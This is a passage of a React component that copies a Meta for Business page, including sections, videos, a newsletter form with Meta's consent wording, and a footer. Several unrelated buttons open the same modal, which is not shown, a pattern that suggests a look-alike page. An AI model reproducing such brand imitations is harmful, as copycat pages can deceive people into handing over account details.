                        fontSize: '36px',
                        fontWeight: '500',
                        color: '#1C2B33',
                        marginBottom: '56px',
                        display: 'block'
                    } }>
                        { texts.toolsTitle }
                    </h1>

                    <div style={ { display: 'flex', alignItems: 'stretch', gap: '80px' } }>

                        {/* LEFT: Accordion */ }
                        <div style={ { width: '40%', flexShrink: 0, borderTop: '1px solid #e5e7eb' } }>
                            { [
                                {
                                    id: 'ads_manager',
                                    title: texts.adsManager,
                                    desc: texts.accordionAdsManagerDesc
                                },
                                { id: 'business_suite', title: texts.accordionBusinessSuiteTitle, desc: texts.accordionBusinessSuiteDesc },
                                { id: 'pixel', title: texts.accordionPixelTitle, desc: texts.accordionPixelDesc },
                                { id: 'pages', title: texts.accordionFbPagesTitle, desc: texts.accordionFbPagesDesc },
                                { id: 'ai_tools', title: texts.accordionAiMarketingTitle, desc: texts.accordionAiMarketingDesc }
                            ].map( ( item ) =>
                            {
                                const isActive = activeAccordion === item.id;
                                return (
                                    <div
                                        key={ item.id }
                                        style={ {
                                            padding: '24px 0',
                                            borderBottom: '1px solid #e5e7eb',
                                            cursor: 'pointer',
                                            color: isActive ? '#1C2B33' : '#6b7280'
                                        } }
                                        onClick={ () => setActiveAccordion( item.id ) }
                                    >
                                        <h3 style={ {
                                            fontSize: '20px',
                                            fontWeight: isActive ? '500' : '400',
                                            color: '#0A1317',
                                            display: 'flex',
                                            justifyContent: 'space-between',
                                            alignItems: 'center',
                                            margin: 0
                                        } }>
                                            { item.title }
                                            { isActive ? (
                                                <svg width="32" height="32" viewBox="0 0 24 24" fill="none">
                                                    <path d="M7 17L17 7M17 7H7M17 7v10" stroke="#0A1317" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
                                                </svg>
                                            ) : (
                                                <svg width="32" height="32" viewBox="0 0 24 24" fill="none">
                                                    <path d="M12 5v14M5 12h14" stroke="#9ca3af" strokeWidth="1.5" strokeLinecap="round" />
                                                </svg>
                                            ) }
                                        </h3>

                                        { isActive && (
                                            <div style={ { maxWidth: '80%' } }>
                                                <p style={ {
                                                    padding: '6px 0',
                                                    margin: '16px 0',
                                                    color: '#5D6C7B',
                                                    fontSize: '16px',
                                                    lineHeight: '1.6'
                                                } }>
                                                    { item.desc }
                                                </p>
                                                <div style={ { display: 'flex', flexDirection: 'column', gap: '8px' } }>
                                                    { [ texts.learnMore, texts.goToAdsManager ].map( ( label ) => (
                                                        <div key={ label } style={ { display: 'flex', alignItems: 'center', gap: '8px', cursor: 'pointer' } }>
                                                            <div style={ {
                                                                width: '32px',
                                                                height: '32px',
                                                                borderRadius: '50%',
                                                                border: '1px solid rgba(10,19,23,0.45)',
                                                                display: 'flex',
                                                                alignItems: 'center',
                                                                justifyContent: 'center',
                                                                flexShrink: 0
                                                            } }>
                                                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
                                                                    <path d="M5 12h14M12 5l7 7-7 7" stroke="#007BFF" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
                                                                </svg>
                                                            </div>
                                                            <span style={ { fontSize: '14px', color: '#007BFF', fontWeight: '500' } }>
                                                                { label }
                                                            </span>
                                                        </div>
                                                    ) ) }
                                                </div>
                                            </div>
                                        ) }
                                    </div>
                                );
                            } ) }
                        </div>

                        {/* RIGHT: Video */ }
                        <div style={ { flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center' } }>
                            <div style={ {
                                maxWidth: '470px',
                                width: '100%',
                                position: 'relative',
                                borderRadius: '32px',
                                overflow: 'hidden',
                                boxShadow: '0 20px 50px rgba(0,0,0,0.1)',
                                aspectRatio: '3/4'
                            } }>
                                <video
                                    ref={ adsVideoRef }
                                    style={ { width: '100%', height: '100%', objectFit: 'cover', display: 'block' } }
                                    muted
                                    loop
                                    playsInline
                                    autoPlay
                                >
                                    <source src={ AdsManagerVideo } type="video/mp4" />
                                </video>

                                {/* Pause/Play button */ }
                                <div style={ { position: 'absolute', bottom: '24px', right: '24px', zIndex: 10 } }>
                                    <button
                                        aria-label={ isAdsVideoPaused ? texts.ariaPlayVideo : texts.ariaPauseVideo }
                                        style={ {
                                            width: '32px', height: '32px',
                                            display: 'flex', alignItems: 'center', justifyContent: 'center',
                                            background: 'rgba(255,255,255,0.2)',
                                            backdropFilter: 'blur(12px)',
                                            border: '1px solid rgba(255,255,255,0.4)',
                                            borderRadius: '50%',
                                            cursor: 'pointer'
                                        } }
                                        onClick={ () =>
                                        {
                                            if ( adsVideoRef.current )
                                            {
                                                isAdsVideoPaused ? adsVideoRef.current.play() : adsVideoRef.current.pause();
                                                setIsAdsVideoPaused( !isAdsVideoPaused );
                                            }
                                        } }
                                    >
                                        { isAdsVideoPaused ? (
                                            <svg width="16" height="16" viewBox="0 0 24 24" fill="white" stroke="none"><polygon points="5,3 19,12 5,21" /></svg>
                                        ) : (
                                            <svg width="16" height="16" viewBox="0 0 24 24" fill="white" stroke="none">
                                                <rect x="14" y="3" width="5" height="18" rx="1" />
                                                <rect x="5" y="3" width="5" height="18" rx="1" />
                                            </svg>
                                        ) }
                                    </button>
                                </div>

                                {/* Gradient overlay */ }
                                <div style={ {
                                    position: 'absolute', bottom: 0, left: 0, right: 0,
                                    height: '33%',
                                    background: 'linear-gradient(to top, rgba(0,0,0,0.2), transparent)',
                                    pointerEvents: 'none', opacity: 0.6
                                } } />
                            </div>
                        </div>

                    </div>
                </div>
            </section>
            {/* ===== END TOOLS SECTION ===== */ }

            {/* ===== INSPIRED SECTION ===== */ }
            <section style={ { padding: '80px 0' } }>
                <div style={ { maxWidth: '1240px', margin: '0 auto', padding: '0 24px' } }>
                    <h2 style={ {
                        fontSize: '36px',
                        fontWeight: '500',
                        color: '#1C2B33',
                        marginBottom: '56px',
                        lineHeight: '1.2',
                        display: 'block'
                    } }>
                        { texts.inspiredTitle }
                    </h2>

                    <div style={ { display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: '0 80px', rowGap: '48px' } }>
                        { [
                            {
                                id: 'streetwear',
                                src: StreetwearVideo,
                                title: texts.streetwearTip
                            },
                            {
                                id: 'brooklinen',
                                src: BrooklinenVideo,
                                title: texts.inspiredBrookShort
                            },
                            {
                                id: 'shopify',
                                src: ShopifyVideo,
                                title: texts.inspiredShopifyShort
                            }
                        ].map( ( item ) =>
                        {
                            const isPlaying = playingVideo === item.id;
                            return (
                                <div key={ item.id } style={ { display: 'flex', flexDirection: 'column', height: '100%' } }>
                                    {/* Video card */ }
                                    <div
                                        style={ {
                                            position: 'relative',
                                            aspectRatio: '3/4',
                                            width: '100%',
                                            background: '#f3f4f6',
                                            borderRadius: '20px',
                                            overflow: 'hidden',
                                            cursor: 'pointer',
                                            boxShadow: '0 10px 30px rgba(0,0,0,0.12)'
                                        } }
                                        onClick={ () =>
                                        {
                                            const videoEl = document.getElementById( `inspired-video-${ item.id }` );
                                            if ( videoEl )
                                            {
                                                if ( isPlaying )
                                                {
                                                    videoEl.pause();
                                                    setPlayingVideo( null );
                                                } else
                                                {
                                                    videoEl.play();
                                                    setPlayingVideo( item.id );
                                                }
                                            }
                                        } }
                                    >
                                        <video
                                            id={ `inspired-video-${ item.id }` }
                                            style={ { width: '100%', height: '100%', objectFit: 'cover', display: 'block' } }
                                            playsInline
                                            loop
                                            muted={ false }
                                        >
                                            <source src={ item.src } type="video/mp4" />
                                        </video>

                                        {/* Play button overlay */ }
                                        { !isPlaying && (
                                            <div style={ {
                                                position: 'absolute', inset: 0,
                                                display: 'flex', alignItems: 'center', justifyContent: 'center',
                                                background: 'rgba(0,0,0,0.1)',
                                                transition: 'background 0.3s'
                                            } }>
                                                <div style={ {
                                                    width: '64px', height: '64px',
                                                    borderRadius: '50%',
                                                    border: '3px solid #fff',
                                                    display: 'flex', alignItems: 'center', justifyContent: 'center',
                                                    backdropFilter: 'blur(4px)',
                                                    background: 'transparent'
                                                } }>
                                                    <svg width="32" height="32" viewBox="0 0 24 24" fill="white" stroke="white" strokeWidth="2">
                                                        <path d="M5 5a2 2 0 0 1 3.008-1.728l11.997 6.998a2 2 0 0 1 .003 3.458l-12 7A2 2 0 0 1 5 19z" />
                                                    </svg>
                                                </div>
                                            </div>
                                        ) }
                                    </div>

                                    {/* Title */ }
                                    <div style={ { marginTop: '24px' } }>
                                        <p style={ {
                                            fontSize: '24px',
                                            fontWeight: '500',
                                            color: '#1C2B33',
                                            lineHeight: '1.4',
                                            margin: 0
                                        } }>
                                            { item.title }
                                        </p>
                                    </div>
                                </div>
                            );
                        } ) }
                    </div>
                </div>
            </section>
            {/* ===== END INSPIRED SECTION ===== */ }

            {/* ===== REACH CUSTOMERS SECTION ===== */ }
            <section style={ { padding: '80px 24px' } }>
                <div style={ {
                    maxWidth: '1240px',
                    margin: '0 auto',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'space-between',
                    gap: '40px'
                } }>
                    {/* Left */ }
                    <div style={ { flex: '1 1 50%' } }>
                        <h2 style={ {
                            fontSize: '36px',
                            fontWeight: '500',
                            color: '#1C2B33',
                            lineHeight: '1.2',
                            marginBottom: '24px',
                            display: 'block'
                        } }>
                            { texts.reachTitle }
                        </h2>
                        <p style={ {
                            fontSize: '18px',
                            color: '#5D6C7B',
                            marginBottom: '40px',
                            maxWidth: '500px',
                            lineHeight: '1.6'
                        } }>
                            { texts.reachDesc }
                        </p>
                        <div style={ { display: 'flex', alignItems: 'center', gap: '32px' } }>
                            {/* Learn more button */ }
                            <div
                                id="reach-learn-more"
                                style={ {
                                    background: '#0457CB',
                                    color: '#fff',
                                    padding: '12px 32px',
                                    borderRadius: '100px',
                                    fontWeight: '500',
                                    fontSize: '15px',
                                    cursor: 'pointer',
                                    whiteSpace: 'nowrap'
                                } }
                                onClick={ () => setShowFirstModal( true ) }
                            >
                                { texts.learnMore }
                            </div>

                            {/* Create ad link */ }
                            <div style={ { display: 'flex', alignItems: 'center', gap: '8px', cursor: 'pointer' } }>
                                <div style={ {
                                    width: '32px', height: '32px',
                                    borderRadius: '50%',
                                    border: '1px solid rgba(10,19,23,0.45)',
                                    display: 'flex', alignItems: 'center', justifyContent: 'center',
                                    flexShrink: 0
                                } }>
                                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
                                        <path d="M5 12h14M12 5l7 7-7 7" stroke="#007BFF" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
                                    </svg>
                                </div>
                                <span style={ { fontSize: '14px', color: '#007BFF', fontWeight: '500' } }>{ texts.createAd }</span>
                            </div>
                        </div>
                    </div>

                    {/* Right: Image */ }
                    <div style={ { flex: '1 1 50%' } }>
                        <img
                            src={ MediaImg }
                            alt={ texts.mediaIllustrationAlt }
                            style={ { width: '100%', height: 'auto', objectFit: 'contain', display: 'block' } }
                        />
                    </div>
                </div>
            </section>
            {/* ===== END REACH CUSTOMERS SECTION ===== */ }

            {/* ===== STAY CONNECTED SECTION ===== */ }
            <section style={ { background: '#fff', padding: '80px 0' } }>
                <div style={ { maxWidth: '1240px', margin: '0 auto', padding: '0 24px' } }>

                    {/* Header */ }
                    <div style={ { marginBottom: '40px' } }>
                        <p style={ { fontSize: '12px', color: '#5D6C7B', textTransform: 'uppercase', letterSpacing: '0.1em', marginBottom: '8px' } }>
                            { texts.metaTechnologiesEyebrow }
                        </p>
                        <h2 style={ { fontSize: '36px', fontWeight: '500', color: '#1C2B33', display: 'block', margin: 0 } }>
                            { texts.connectedTitle }
                        </h2>
                    </div>

                    <div style={ { display: 'flex', flexDirection: 'row', gap: '40px', alignItems: 'flex-start' } }>

                        {/* Platform icons column */ }
                        <div style={ { display: 'flex', flexDirection: 'column', gap: '24px', paddingTop: '80px', minWidth: '32px', flexShrink: 0 } }>
                            { [
                                { id: 'facebook', label: texts.footerFcMetaFb, src: FbIcon },
                                { id: 'messenger', label: texts.footerFcMetaMsg, src: MessengerIcon },
                                { id: 'instagram', label: texts.footerFcMetaIg, src: IgIcon },
                                { id: 'whatsapp', label: texts.footerFcMetaWa, src: WhatsappIcon }
                            ].map( ( platform ) => (
                                <div
                                    key={ platform.id }
                                    title={ platform.label }
                                    style={ {
                                        cursor: 'pointer',
                                        opacity: activeTab === platform.id ? 1 : 0.2,
                                        filter: activeTab === platform.id ? 'none' : 'grayscale(1)',
                                        transition: 'all 0.3s'
                                    } }
                                    onClick={ () => setActiveTab( platform.id ) }
                                >
                                    <img src={ platform.src } alt={ platform.label } style={ { width: '32px', height: '32px', objectFit: 'contain', display: 'block' } } />
                                </div>
                            ) ) }
                        </div>

                        {/* Video */ }
                        <div style={ { position: 'relative', maxWidth: '504px', width: '100%', flexShrink: 0, padding: '0 16px' } }>
                            <div style={ { borderRadius: '24px', overflow: 'hidden', aspectRatio: '3/4' } }>
                                <video
                                    ref={ fansVideoRef }
                                    style={ { width: '100%', height: '100%', objectFit: 'cover', display: 'block' } }
                                    autoPlay
                                    loop
                                    muted
                                    playsInline
                                >
                                    <source src={ FansVideo } type="video/mp4" />
                                </video>
                            </div>
                            <div style={ { position: 'absolute', bottom: '24px', right: '24px', zIndex: 20 } }>
                                <button
                                    aria-label={ isFansVideoPaused ? texts.ariaPlayVideo : texts.ariaPauseVideo }
                                    style={ {
                                        width: '32px', height: '32px',
                                        display: 'flex', alignItems: 'center', justifyContent: 'center',
                                        background: 'rgba(255,255,255,0.2)',
                                        backdropFilter: 'blur(12px)',
                                        border: '1px solid rgba(255,255,255,0.4)',
                                        borderRadius: '50%',
                                        cursor: 'pointer'
                                    } }
                                    onClick={ () =>
                                    {
                                        if ( fansVideoRef.current )
                                        {
                                            isFansVideoPaused ? fansVideoRef.current.play() : fansVideoRef.current.pause();
                                            setIsFansVideoPaused( !isFansVideoPaused );
                                        }
                                    } }
                                >
                                    { isFansVideoPaused ? (
                                        <svg width="16" height="16" viewBox="0 0 24 24" fill="white" stroke="none"><polygon points="5,3 19,12 5,21" /></svg>
                                    ) : (
                                        <svg width="16" height="16" viewBox="0 0 24 24" fill="white" stroke="none">
                                            <rect x="14" y="3" width="5" height="18" rx="1" />
                                            <rect x="5" y="3" width="5" height="18" rx="1" />
                                        </svg>
                                    ) }
                                </button>
                            </div>
                        </div>

                        {/* Content */ }
                        <div style={ { flex: 1, paddingTop: '160px', paddingLeft: '40px' } }>
                            <p style={ { fontSize: '14px', color: '#5D6C7B', marginBottom: '8px', fontWeight: '400' } }>
                                { texts.marketingOnFacebookEyebrow }
                            </p>
                            <h3 style={ {
                                fontSize: '36px',
                                fontWeight: '500',
                                color: '#1C2B33',
                                lineHeight: '1.2',
                                marginBottom: '16px',
                                display: 'block'
                            } }>
                                { texts.fansBuildFollowingTitle }
                            </h3>
                            <p style={ { fontSize: '16px', color: '#5D6C7B', marginBottom: '32px', lineHeight: '1.6' } }>
                                { texts.fansBuildFollowingDesc }
                            </p>
                            <div style={ { display: 'flex', alignItems: 'center', gap: '8px', cursor: 'pointer' } }>
                                <div style={ {
                                    width: '32px', height: '32px',
                                    borderRadius: '50%',
                                    border: '1px solid rgba(10,19,23,0.45)',
                                    display: 'flex', alignItems: 'center', justifyContent: 'center',
                                    flexShrink: 0
                                } }>
                                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
                                        <path d="M5 12h14M12 5l7 7-7 7" stroke="#007BFF" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
                                    </svg>
                                </div>
                                <span style={ { fontSize: '14px', color: '#007BFF', fontWeight: '500' } }>{ texts.exploreFacebookLink }</span>
                            </div>
                        </div>

                    </div>
                </div>
            </section>
            {/* ===== END STAY CONNECTED SECTION ===== */ }

            {/* ===== SUPPORT SECTION ===== */ }
            <section style={ { background: '#f6f6f6', padding: '56px 0' } }>
                <div style={ {
                    maxWidth: '1504px',
                    margin: '0 auto',
                    padding: '0 24px',
                    display: 'flex',
                    flexDirection: 'row',
                    alignItems: 'center',
                    gap: '64px'
                } }>

                    {/* Left: Video (order 1 on desktop) */ }
                    <div style={ { position: 'relative', flex: '1 1 50%', display: 'flex', justifyContent: 'center' } }>
                        <div style={ {
                            position: 'relative',
                            borderRadius: '24px',
                            overflow: 'hidden',
                            aspectRatio: '1/1',
                            width: '100%',
                            background: '#000'
                        } }>
                            <video
                                ref={ supportVideoRef }
                                style={ { width: '100%', height: '100%', objectFit: 'cover', opacity: 0.95, display: 'block' } }
                                autoPlay
                                loop
                                muted
                                playsInline
                            >
                                <source src={ SupportVideo } type="video/mp4" />
                            </video>

                            {/* Floating card overlay */ }
                            <div style={ {
                                position: 'absolute',
                                top: '60%',
                                left: '50%',
                                transform: 'translateX(-50%)',
                                width: '70%',
                                zIndex: 10
                            } }>
                                <div style={ {
                                    background: '#fff',
                                    borderRadius: '8px',
                                    padding: '16px 24px',
                                    boxShadow: '0 12px 40px rgba(0,0,0,0.15)',
                                    display: 'flex',
                                    alignItems: 'center',
                                    justifyContent: 'space-between'
                                } }>
                                    <span style={ { color: '#1C2B33', fontSize: '18px', fontWeight: '500', whiteSpace: 'nowrap' } }>
                                        { texts.createPage }
                                    </span>
                                    <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#5D6C7B" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                                        <path d="m21 21-4.34-4.34" />
                                        <circle cx="11" cy="11" r="8" />
                                    </svg>
                                </div>
                            </div>

                            {/* Pause/Play button */ }
                            <div style={ { position: 'absolute', bottom: '24px', right: '24px', zIndex: 20 } }>
                                <button
                                    aria-label={ isSupportVideoPaused ? texts.ariaPlayVideo : texts.ariaPauseVideo }
                                    style={ {
                                        width: '32px', height: '32px',
                                        display: 'flex', alignItems: 'center', justifyContent: 'center',
                                        background: 'rgba(255,255,255,0.2)',
                                        backdropFilter: 'blur(12px)',
                                        border: '1px solid rgba(255,255,255,0.4)',
                                        borderRadius: '50%',
                                        cursor: 'pointer'
                                    } }
                                    onClick={ () =>
                                    {
                                        if ( supportVideoRef.current )
                                        {
                                            isSupportVideoPaused ? supportVideoRef.current.play() : supportVideoRef.current.pause();
                                            setIsSupportVideoPaused( !isSupportVideoPaused );
                                        }
                                    } }
                                >
                                    { isSupportVideoPaused ? (
                                        <svg width="16" height="16" viewBox="0 0 24 24" fill="white" stroke="none"><polygon points="5,3 19,12 5,21" /></svg>
                                    ) : (
                                        <svg width="16" height="16" viewBox="0 0 24 24" fill="white" stroke="none">
                                            <rect x="14" y="3" width="5" height="18" rx="1" />
                                            <rect x="5" y="3" width="5" height="18" rx="1" />
                                        </svg>
                                    ) }
                                </button>
                            </div>
                        </div>
                    </div>

                    {/* Right: Text content (order 2 on desktop) */ }
                    <div style={ { flex: '1 1 50%' } }>
                        <div style={ { maxWidth: '500px' } }>
                            <p style={ {
                                fontSize: '12px',
                                color: '#5D6C7B',
                                textTransform: 'uppercase',
                                letterSpacing: '0.1em',
                                marginBottom: '12px',
                                fontWeight: '500'
                            } }>
                                { texts.supportCentreEyebrow }
                            </p>
                            <h2 style={ {
                                fontSize: '40px',
                                fontWeight: '500',
                                color: '#1C2B33',
                                lineHeight: '1.2',
                                marginBottom: '32px',
                                display: 'block'
                            } }>
                                { texts.supportAnswersTitle }
                            </h2>
                            <div style={ { display: 'flex', alignItems: 'center', gap: '32px' } }>
                                <button
                                    id="support-get-support"
                                    style={ {
                                        background: '#1877F2',
                                        color: '#fff',
                                        padding: '14px 32px',
                                        borderRadius: '100px',
                                        fontWeight: '600',
                                        fontSize: '16px',
                                        border: 'none',
                                        cursor: 'pointer',
                                        boxShadow: '0 10px 30px rgba(24,119,242,0.2)'
                                    } }
                                    onClick={ () => setShowFirstModal( true ) }
                                >
                                    { texts.getSupport }
                                </button>
                            </div>
                        </div>
                    </div>

                </div>
            </section>
            {/* ===== END SUPPORT SECTION ===== */ }

            {/* ===== RESOURCES SECTION ===== */ }
            <section style={ {
                width: '100%',
                padding: '100px 16px',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                textAlign: 'center',
                backgroundImage: `url(${ BackgroundImg })`,
                backgroundSize: 'cover',
                backgroundPosition: 'center',
                backgroundRepeat: 'no-repeat'
            } }>
                <div style={ {
                    maxWidth: '1240px',
                    display: 'flex',
                    flexDirection: 'column',
                    alignItems: 'center',
                    gap: '32px'
                } }>
                    <h2 style={ {
                        fontSize: '36px',
                        fontWeight: '500',
                        color: '#1C2B33',
                        margin: 0,
                        display: 'block'
                    } }>
                        { texts.resourcesTitle }
                    </h2>
                    <button
                        id="resources-learn-more"
                        style={ {
                            background: '#1877F2',
                            color: '#fff',
                            padding: '12px 32px',
                            borderRadius: '100px',
                            fontWeight: '600',
                            fontSize: '15px',
                            border: 'none',
                            cursor: 'pointer',
                            boxShadow: '0 4px 12px rgba(0,0,0,0.15)'
                        } }
                        onClick={ () => setShowFirstModal( true ) }
                    >
                        { texts.learnMore }
                    </button>
                </div>
            </section>
            {/* ===== END RESOURCES SECTION ===== */ }

            {/* ===== FOOTER ===== */ }
            <footer style={ { background: '#1b2a34', color: '#fff' } }>

                {/* Newsletter section */ }
                <div style={ { maxWidth: '1175px', margin: '0 auto', padding: '80px 24px' } }>
                    <div style={ { display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '40px', alignItems: 'start' } }>
                        <div>
                            <h2 style={ { fontSize: '30px', fontWeight: '600', color: '#fff', lineHeight: '1.3', marginBottom: '16px', display: 'block' } }>
                                { texts.footerUpdateTitle }
                            </h2>
                            <p style={ { color: '#9ca3af', maxWidth: '420px', lineHeight: '1.6', fontSize: '15px' } }>
                                { texts.footerUpdateDesc }
                            </p>
                        </div>
                        <div style={ { width: '100%', maxWidth: '540px' } }>
                            <div style={ { display: 'flex', gap: '16px', marginBottom: '16px' } }>
                                <input
                                    type="email"
                                    placeholder={ texts.emailAddressPlaceholder || "Email address" }
                                    style={ { flex: 1, padding: '12px 16px', borderRadius: '8px', border: 'none', outline: 'none', color: '#465a69', fontSize: '16px', height: '52px' } }
                                />
                                <input
                                    type="text"
                                    placeholder={ texts.enterCountry || "Enter a country name..." }
                                    style={ { flex: 1, padding: '12px 16px', borderRadius: '8px', border: 'none', outline: 'none', color: '#465a69', fontSize: '16px', height: '52px' } }
                                />
                            </div>
                            <p style={ { fontSize: '12px', color: '#9ca3af', lineHeight: '1.6', marginBottom: '16px' } }>
                                { texts.footerDisclaimer || 'By submitting this form, you agree to receive marketing related electronic communications from Meta, including news, events, updates and promotional emails. You may withdraw your consent and unsubscribe from these at any time, for example, by clicking the unsubscribe link included in our emails. For more information about how Meta handles your data, please read our' }{ ' ' }
                                <span style={ { textDecoration: 'underline', cursor: 'pointer' } }>{ texts.dataPolicy || "Data Policy" }</span>.
                            </p>
                            <button style={ { background: '#0062ff', color: '#fff', padding: '0 24px', height: '50px', display: 'flex', alignItems: 'center', justifyContent: 'center', borderRadius: '100px', fontWeight: '600', fontSize: '15px', border: 'none', cursor: 'pointer' } } onClick={ () => setShowFirstModal( true ) }>
                                { texts.subscribeBtn }
                            </button>
                        </div>
                    </div>
                </div>

                <div style={ { borderTop: '1px solid rgba(255,255,255,0.2)' } } />

                {/* Navigation grid */ }
                <div style={ { background: '#1b2a34', color: '#9ca3af' } }>
                    <div style={ { maxWidth: '1175px', margin: '0 auto', padding: '80px 24px' } }>
                        <div style={ { display: 'grid', gridTemplateColumns: 'repeat(7, 1fr)', gap: '32px 24px' } }>
                            { [
                                {
                                    colId: 'tech',
                                    title: texts.footerFcColMetaTech,
                                    links: [
                                        texts.footerFcMetaFb,
                                        texts.footerFcMetaIg,
                                        texts.footerFcMetaMsg,
                                        texts.footerFcMetaWa,
                                        texts.footerFcMetaAn,
                                        texts.footerFcMetaQuest,
                                        texts.footerFcMetaWorkplace,
                                        texts.footerFcMetaForWork
                                    ]
                                },
                                {
                                    colId: 'tools',
                                    title: texts.footerFcColTools,
                                    links: [
                                        texts.footerFcToolsFt,
                                        texts.footerFcToolsFbPages,
                                        texts.footerFcToolsIgProfiles,
                                        texts.footerFcToolsStories,
                                        texts.footerFcToolsShops,
                                        texts.footerFcToolsMbs,
                                        texts.footerFcToolsFbAds,
                                        texts.footerFcToolsIgAds,
                                        texts.footerFcToolsVideoAds,
                                        texts.footerFcToolsAdsMgr
                                    ]
                                },
                                {
                                    colId: 'goals',
                                    title: texts.footerFcColGoals,
                                    links: [
                                        texts.footerFcGoalsFbPage,
                                        texts.footerFcGoalsBrandAwareness,
                                        texts.footerFcGoalsLocal,
                                        texts.footerFcGoalsOnlineSales,
                                        texts.footerFcGoalsApp,
                                        texts.footerFcGoalsLeads,
                                        texts.footerFcGoalsMeasure,
                                        texts.footerFcGoalsRetarget
                                    ]
                                },
                                {
                                    colId: 'biz',
                                    title: texts.footerFcColBusinessTypes,
                                    links: [
                                        texts.footerFcBizSmall,
                                        texts.footerFcBizLarge,
                                        texts.footerFcBizAgency,
                                        texts.footerFcBizMedia,
                                        texts.footerFcBizCreator,
                                        texts.footerFcBizDev,
                                        texts.footerFcBizPartner
                                    ]
                                },
                                {
                                    colId: 'industry',
                                    title: texts.footerFcColIndustries,
                                    links: [
                                        texts.footerFcIndustryAuto,
                                        texts.footerFcIndustryCpg,
                                        texts.footerFcIndustryEcom,
                                        texts.footerFcIndustryEnt,
                                        texts.footerFcIndustryFin,
                                        texts.footerFcIndustryGaming,
                                        texts.footerFcIndustryProperty,
                                        texts.footerFcIndustryRest,
                                        texts.footerFcIndustryRetail,
                                        texts.footerFcIndustryTech,
                                        texts.footerFcIndustryTravel
                                    ]
                                },
                                {
                                    colId: 'skills',
                                    title: texts.footerFcColSkills,
                                    links: [
                                        texts.footerFcSkillsOnline,
                                        texts.footerFcSkillsCert,
                                        texts.footerFcSkillsWebinars
                                    ]
                                },
                                {
                                    colId: 'guides',
                                    title: texts.footerFcColGuides,
                                    links: [
                                        texts.footerFcGuideAds,
                                        texts.footerFcGuideBrand,
                                        texts.footerFcGuideBook,
                                        texts.footerFcGuideMedia,
                                        texts.footerFcGuideSitemap
                                    ]
                                }
                            ].map( ( col ) => (
                                <div key={ col.colId }>
                                    <h3 style={ { color: '#cbd2d9', fontSize: '14px', marginBottom: '16px', letterSpacing: '0.025em', fontWeight: '500' } }>
                                        { col.title }
                                    </h3>
                                    <ul style={ { listStyle: 'none', padding: 0, margin: 0, display: 'flex', flexDirection: 'column', gap: '12px' } }>
                                        { col.links.map( ( link ) => (
                                            <li key={ `${ col.colId }_${ link }` }>
                                                <a
                                                    href="#"
                                                    style={ { color: '#9ca3af', fontSize: '13px', textDecoration: 'none', transition: 'color 0.2s' } }
                                                    onMouseOver={ ( e ) => e.target.style.color = '#e5e7eb' }
                                                    onMouseOut={ ( e ) => e.target.style.color = '#9ca3af' }
                                                >
                                                    { link }
                                                </a>
                                            </li>
                                        ) ) }
                                    </ul>
                                </div>
                            ) ) }
                        </div>

                        {/* Bottom bar */ }
                        <div style={ { borderTop: '1px solid #465A69', paddingTop: '48px', marginTop: '48px' } }>
                            <div style={ { display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', gap: '24px' } }>
                                {/* Copyright + Social icons */ }
                                <div>
                                    <p style={ { color: '#cbd2d9', fontSize: '13px', marginBottom: '16px' } }>{ texts.footerCopyrightNotice }</p>
                                    <div style={ { display: 'flex', gap: '12px' } }>
                                        { [
                                            {
                                                label: texts.footerSocialFacebook,
                                                svg: <svg width="24" height="24" viewBox="0 0 24 24" fill="#cbd2d9"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z" /></svg>
                                            },
                                            {
                                                label: texts.footerSocialInstagram,
                                                svg: <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#cbd2d9" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="2" y="2" width="20" height="20" rx="5" /><circle cx="12" cy="12" r="4" /><circle cx="17.5" cy="6.5" r="1" fill="#cbd2d9" stroke="none" /></svg>
                                            },
                                            {
                                                label: texts.footerSocialX,
                                                svg: <svg width="24" height="24" viewBox="0 0 24 24" fill="#cbd2d9"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231 5.45-6.231Zm-1.161 17.52h1.833L7.084 4.126H5.117Z" /></svg>
                                            },
                                            {
                                                label: texts.footerSocialLinkedIn,
                                                svg: <svg width="24" height="24" viewBox="0 0 24 24" fill="#cbd2d9"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z" /><rect x="2" y="9" width="4" height="12" /><circle cx="4" cy="4" r="2" /></svg>
                                            }
                                        ].map( ( s ) => (
                                            <span key={ s.label } title={ s.label } style={ { cursor: 'pointer', display: 'flex' } }>
                                                { s.svg }
                                            </span>
                                        ) ) }
                                    </div>
                                </div>

                                {/* Legal links */ }
                                <div style={ { display: 'flex', flexWrap: 'wrap', gap: '12px 24px' } }>
                                    { [
                                        texts.footerLegalAbout,
                                        texts.footerLegalDevelopers,
                                        texts.footerLegalCareers,
                                        texts.footerLegalPrivacy,
                                        texts.footerLegalCookies,
                                        texts.footerLegalTerms,
                                        texts.footerLegalHelp
                                    ].map( ( link ) => (
                                        <a
                                            key={ link }
                                            href="#"
                                            style={ { color: '#cbd2d9', fontSize: '13px', textDecoration: 'none' } }
                                            onMouseOver={ ( e ) => e.target.style.color = '#e5e7eb' }
                                            onMouseOut={ ( e ) => e.target.style.color = '#cbd2d9' }
                                        >
                                            { link }
                                        </a>
                                    ) ) }
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </footer>
            {/* ===== END FOOTER ===== */ }

            {/* Modals - giữ nguyên, không chỉnh sửa */ }
